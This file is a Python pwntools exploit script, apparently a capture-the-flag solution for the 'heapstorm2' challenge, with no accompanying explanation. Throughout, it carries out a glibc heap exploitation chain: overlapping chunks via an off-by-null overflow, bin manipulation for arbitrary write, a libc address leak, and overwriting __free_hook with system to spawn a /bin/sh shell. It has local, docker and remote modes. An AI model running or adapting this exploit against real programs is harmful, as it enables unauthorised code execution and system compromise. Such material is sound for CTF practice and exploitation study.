from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./heapstorm2"
LIBC = "./libc-2.24.so"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("Command: ")

def allocate(conn, sz):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil(": ")
    conn.sendline(str(sz))

def update(conn, idx, sz, s):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil(": ")
    conn.sendline(str(idx))
    conn.recvuntil(": ")
    conn.sendline(str(sz))
    conn.recvuntil(": ")
    conn.sendline(s)

def delete(conn, idx):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvuntil(": ")
    conn.sendline(str(idx))

def view(conn, idx):
    recvmenu(conn)
    conn.sendline("4")
    conn.recvuntil(": ")
    conn.sendline(str(idx))
    conn.recvuntil("]: ")

def exploit(conn, elf, libc, local):
    allocate(conn, 0x460) # 0
    allocate(conn, 0xd0)  # 1
    allocate(conn, 0x460) # 2
    allocate(conn, 0xd8)  # 3
    allocate(conn, 0x670) # 4
    allocate(conn, 0x20)  # 5

    payload = ""
    payload += "A"*0x5f0
    payload += p64(0x600)
    payload += p64(0x21)
    payload += "A"*0x18
    payload += p64(0x21)
    update(conn, 4, len(payload), payload)

    delete(conn, 4)

    payload = ""
    payload += "A"*(0xd8 - 12)
    update(conn, 3, len(payload), payload)

    allocate(conn, 0x1a0) # 4
    allocate(conn, 0x440) # 6

    delete(conn, 4)
    delete(conn, 5)

    # 0xc50
    allocate(conn, 0x200) # 4
    allocate(conn, 0x18)  # 5
    allocate(conn, 0x2a0) # 7
    allocate(conn, 0xd0)  # 8

    payload = ""
    payload += "A"*0x1a8
    payload += p64(0x451)
    update(conn, 4, len(payload), payload)

    delete(conn, 6)
    delete(conn, 1)

    allocate(conn, 0xd0) # 1

    delete(conn, 3)
    delete(conn, 0)

    allocate(conn, 0x460) # 0

    payload += p64(0x133707b0)
    payload += p64(0x133707b0)
    payload += p64(0x133707b0)
    payload += p64(0x133707b0)
    update(conn, 4, len(payload), payload)

    delete(conn, 0)
    allocate(conn, 0x18) # 0
    delete(conn, 2)

    payload = ""
    payload += "A"*0x1a8
    payload += p64(0x451)
    payload += p64(0x133707bd + 8) * 4
    update(conn, 4, len(payload), payload)

    allocate(conn, 0x10) # 2

    payload = ""
    payload += "A"*0x1a8
    payload += p64(0x451)
    payload += p64(0x133707bd + 8) * 4
    update(conn, 4, len(payload), payload)

    allocate(conn, 0x90) # 3
    payload = ""
    payload += "A" * 0x1f0
    payload += p64(0x200)
    payload += p64(0x21)
    payload += "A"*0x18
    payload += p64(0x21)
    update(conn, 7, len(payload), payload)

    delete(conn, 7)
    update(conn, 5, 0x18 - 12, "A"*(0x18 - 12))

    allocate(conn, 0x60) # 6
    allocate(conn, 0x180) # 7

    delete(conn, 6)
    delete(conn, 8)

    allocate(conn, 0x500) # 6

    payload = ""
    payload += "A"*0x68
    payload += p64(0x21)
    payload += "A"*0x18
    payload += p64(0x21)
    payload += "A"*0x18
    payload += p64(0x21)
    update(conn, 6, len(payload), payload)

    delete(conn, 7)

    # d40
    payload = ""
    payload += "A"*0x68
    payload += p64(0x61)
    payload += p64(0x13370800)
    payload += p64(0x133707bd)
    update(conn, 6, len(payload), payload)

    pause()
    allocate(conn, 0x40) # 7
    payload = ""
    payload += p64(0xa1)
    payload += p64(0x13370720)
    payload += p64(0x13370720)
    update(conn, 7, len(payload), payload)

    allocate(conn, 0x90) # 8

    payload = ""
    payload += "A"*3
    payload += "A"*0x28
    payload += p64(0)
    payload += p64(0)
    payload += p64(0x13370000)
    payload += p64(0x7331)
    payload += p64(0x13370830)
    payload += p64(0x100)
    payload += p64(0x13370730)
    payload += p64(0x100)
    update(conn, 8, len(payload), payload)

    view(conn, 1)
    libcleak = u64(conn.recv(8))
    libc.address = libcleak - 0x3c4b78
    log.info("%#x", libc.address)

    payload = ""
    payload += p64(libc.symbols['__free_hook'])
    payload += p64(0x100)
    payload += p64(0x13370850)
    payload += p64(0x100)
    payload += "/bin/sh\x00"
    update(conn, 0, len(payload), payload)

    payload = ""
    payload += p64(libc.symbols['system'])
    update(conn, 1, len(payload), payload)

    delete(conn, 2)

    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            #202.120.7.205 5655
            H,P = ("", 1337)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
